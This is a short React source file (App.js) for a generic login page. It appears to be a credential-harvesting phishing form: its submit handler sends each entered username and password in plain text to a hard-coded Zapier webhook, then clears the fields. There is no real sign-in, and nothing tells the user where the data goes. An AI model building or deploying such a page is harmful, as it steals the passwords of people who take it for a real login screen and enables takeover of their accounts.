// App.js
import React, { useState } from 'react';

function App() {
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    const webhookUrl = 'https://hooks.zapier.com/hooks/catch/21068256/28zjy8z/';
  
    try {
      const params = new URLSearchParams();
      params.append('username', formData.username);
      params.append('password', formData.password);
  
      const response = await fetch(webhookUrl, {
        method: 'POST',
        body: params,
      });
  
      if (response.ok) {
        setFormData({ username: '', password: '' }); 
      } else {
        alert('Failed to send data.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred while sending data.');
    }
  };
  

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-md shadow-lg w-96">
        
        <form className="space-y-4" onSubmit={handleSubmit}>
          <div>
            <label className="block text-gray-700 mb-1" htmlFor="username">Username or Email</label>
            <input
              type="text"
              name="username"
              id="username"
              placeholder="Username or Email"
              value={formData.username}
              onChange={handleChange}
              className="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <div>
            <label className="block text-gray-700 mb-1" htmlFor="password">Password</label>
            <input
              type="password"
              name="password"
              id="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
            />
          </div>
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition duration-200"
          >
            Log In
          </button>
        </form>
        <div className="flex items-center justify-between my-4">
          <div className="w-1/3 border-t border-gray-300"></div>
          <span className="text-sm text-gray-500">OR</span>
          <div className="w-1/3 border-t border-gray-300"></div>
        </div>
        <div className="flex justify-center">
         
        </div>
        <p className="text-sm text-center text-gray-500 mt-4">
          Forgot your password?
        </p>
      </div>
      
    </div>
  );
}

export default App;
